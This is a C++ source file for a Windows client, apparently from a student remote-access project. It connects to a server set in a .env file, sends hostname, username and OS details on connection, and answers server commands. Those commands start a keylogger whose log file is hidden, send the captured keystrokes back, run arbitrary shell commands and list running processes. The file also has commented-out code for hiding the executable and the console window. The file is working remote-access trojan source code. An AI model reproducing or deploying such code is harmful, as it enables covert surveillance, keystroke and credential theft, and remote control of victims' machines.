// #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#define WIN32_LEAN_AND_MEAN
#include <windows.h>   
#include <psapi.h>      

#include <iostream>
#include <thread>
#include <atomic>
#include <iomanip>
#include <sstream>
#include <vector>
#include <string>
#include <chrono>

#include "../utils/EnvLoader.hpp"
#include "../utils/LPTF/LPTF_Socket.hpp"
#include "../utils/LPTF/LPTF_PacketType.hpp"
#include "../utils/LPTF/LPTF_Packet.hpp"
#include "../utils/SystemInfo/SystemInfo.hpp"
#include "../utils/SystemInfo/TaskList.hpp"
#include "../utils/NetworkInfo/NetworkInfoFactory.hpp"
#include "../utils/SystemInfo/KeyLogger.hpp"
#include "../utils/CommandSystem/BashExec.hpp"

// Global variables for thread communication
std::atomic<bool> running(true);
LPTF_Socket *globalSocket = nullptr;
static KeyLogger *globalLogger = nullptr;
static std::thread keylogThread;

// Thread function to handle server requests
void serverRequestHandler()
{
    while (running)
    {
        try
        {
            std::vector<uint8_t> data = globalSocket->recvBinary();
            LPTF_Packet packet = LPTF_Packet::deserialize(data);

            switch (packet.getType())
            {
            case PacketType::GET_INFO:
            {
                std::cout << "\n[CLIENT DEBUG] Received GET_INFO packet from server." << std::endl;
                std::cout << "[CLIENT DEBUG] Raw payload: '" << std::string(packet.getPayload().begin(), packet.getPayload().end()) << "'" << std::endl;

                // Collect system information
                std::cout << "[CLIENT DEBUG] Gathering system info..." << std::endl;
                auto sysInfo = SystemInfo::getSystemInfo();
                for (const auto &pair : sysInfo)
                {
                    std::cout << "[CLIENT DEBUG]   " << pair.first << ": " << pair.second << std::endl;
                }
                std::string jsonInfo = SystemInfo::toJson(sysInfo);
                std::cout << "[CLIENT DEBUG] System info JSON: " << jsonInfo << std::endl;

                // Send response
                std::vector<uint8_t> payload(jsonInfo.begin(), jsonInfo.end());
                LPTF_Packet response(1, PacketType::RESPONSE, 0, 1, 1, payload);
                std::cout << "[CLIENT DEBUG] Sending RESPONSE packet with system info to server." << std::endl;
                globalSocket->sendBinary(response.serialize());
                std::cout << "[CLIENT DEBUG] RESPONSE packet sent." << std::endl;
                break;
            }

            case PacketType::RESPONSE:
            {
                break;
            }

            case PacketType::KEYLOG:
            {
                // Start or stop keylogger based on payload
                std::string cmd(packet.getPayload().begin(), packet.getPayload().end());
                if (cmd == "start")
                {
                    if (!globalLogger)
                    {
                        globalLogger = new KeyLogger("key_file.txt");
                        KeyLogger::hideFile("key_file.txt");
                        keylogThread = std::thread([]()
                                                   { globalLogger->start(); });
                        keylogThread.detach();
                    }
                }
                else if (cmd == "stop")
                {
                    if (globalLogger)
                    {
                        globalLogger->stop();
                        
                        // Wait a moment for the keylogger to fully stop
                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
                        
                        // Retrieve the logged data
                        std::string loggedData = globalLogger->getLoggedData();
                        
                        // Send the logged data back to the server
                        std::vector<uint8_t> responsePayload(loggedData.begin(), loggedData.end());
                        LPTF_Packet logResponse(1, PacketType::RESPONSE, 0, packet.getPacketId(), packet.getSessionId(), responsePayload);
                        globalSocket->sendBinary(logResponse.serialize());
                        
                        // Clear the log file after sending the data
                        globalLogger->clearLogFile();
                        
                        KeyLogger::unhideFile("key_file.txt");
                        delete globalLogger;
                        globalLogger = nullptr;
                    }
                }

                break;
            }

            case PacketType::EXEC_COMMAND:
            {
                std::string cmd(packet.getPayload().begin(), packet.getPayload().end());
                BashExec exec;
                BashExec::executeToFile(cmd, "exec_output.txt");
                break;
            }

            case PacketType::PROCESS_LIST:
            {
                // flags bit 0 = noms seulement
                bool namesOnly = (packet.getFlags() & 1) != 0;

                // Récupère la liste des processus
                std::string resp;
                DWORD pids[1024], cbNeeded;
                if (EnumProcesses(pids, sizeof(pids), &cbNeeded))
                {
                    size_t count = cbNeeded / sizeof(DWORD);
                    for (size_t i = 0; i < count; ++i)
                    {
                        DWORD pid = pids[i];
                        if (pid == 0)
                            continue;

                        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                                   FALSE, pid);
                        if (!hProc)
                            continue;

                        CHAR nameBuf[MAX_PATH] = {0};
                        HMODULE hMod;
                        DWORD cbMod;
                        if (EnumProcessModules(hProc, &hMod, sizeof(hMod), &cbMod))
                        {
                            GetModuleBaseNameA(hProc, hMod, nameBuf, sizeof(nameBuf));
                        }
                        CloseHandle(hProc);

                        std::string name(nameBuf);
                        if (namesOnly)
                        {
                            resp += name + "\n";
                        }
                        else
                        {
                            resp += std::to_string(pid) + "  " + name + "\n";
                        }
                    }
                }

                // Envoi de la réponse avec le même sessionId / packetId si besoin
                std::vector<uint8_t> payload(resp.begin(), resp.end());
                LPTF_Packet reply(
                    /*version*/ 1,
                    /*type*/ PacketType::PROCESS_LIST,
                    /*flags*/ 0,
                    /*packetId*/ packet.getPacketId(),
                    /*sessionId*/ packet.getSessionId(),
                    /*payload*/ payload);
                globalSocket->sendBinary(reply.serialize());
                break;
            }

            default:
                std::cout << "\n[SERVEUR] Type de paquet inconnu: " << (int)packet.getType() << std::endl;
                std::cout << "Entrez le message : ";
                std::cout.flush();
            }
        }
        catch (const std::exception &e)
        {
            if (running)
            {
                std::cout << "\n[ERREUR] Connexion fermée: " << e.what() << std::endl;
                running = false;
            }
            break;
        }
    }
}

int main()
{
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);

    // Hide the current executable
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    // Hide the .exe
    // SetFileAttributesA(exePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    KeyLogger::hideFile("key_file.txt");

    try
    {
        LPTF_Socket::initialize();
        LPTF_Socket clientSocket;
        globalSocket = &clientSocket;

        auto env = EnvLoader::loadEnv("../../.env");
        std::string ip = EnvLoader::loadIP("../../.env");
        int port = EnvLoader::loadPort("../../.env");

        clientSocket.connectSocket(ip, port);
        std::cout << "Connecté au serveur " << ip << ":" << port << std::endl;

        // AUTO-SEND SYSTEM INFO ON CONNECTION
        std::cout << "Envoi automatique des informations système..." << std::endl;
        auto sysInfo = SystemInfo::getSystemInfo();
        std::string jsonInfo = SystemInfo::toJson(sysInfo);

        std::cout << "Informations système:" << std::endl;
        std::cout << "- Nom d'hôte: " << sysInfo["hostname"] << std::endl;
        std::cout << "- Utilisateur: " << sysInfo["username"] << std::endl;
        std::cout << "- Système: " << sysInfo["operating_system"] << std::endl;

        // Send system info as GET_INFO packet (since that's what server expects)
        std::vector<uint8_t> payload(jsonInfo.begin(), jsonInfo.end());
        LPTF_Packet sysInfoPacket(1, PacketType::GET_INFO, 0, 1, 1, payload);
        clientSocket.sendBinary(sysInfoPacket.serialize());

        std::cout << "Informations système envoyées au serveur." << std::endl;

        ProcessLister processLister;
        std::vector<std::string> exeList = processLister.getExeList();

        std::thread serverThread(serverRequestHandler);
        // Main thread for user interaction
        while (running)
        {
        }
        // Clean shutdown
        running = false;
        if (serverThread.joinable())
        {
            serverThread.join();
        }
        clientSocket.closeSocket();
    }
    catch (const std::exception &e)
    {
        std::cerr << "Exception Client: " << e.what() << std::endl;
        running = false;
        return 1;
    }
    return 0;
}
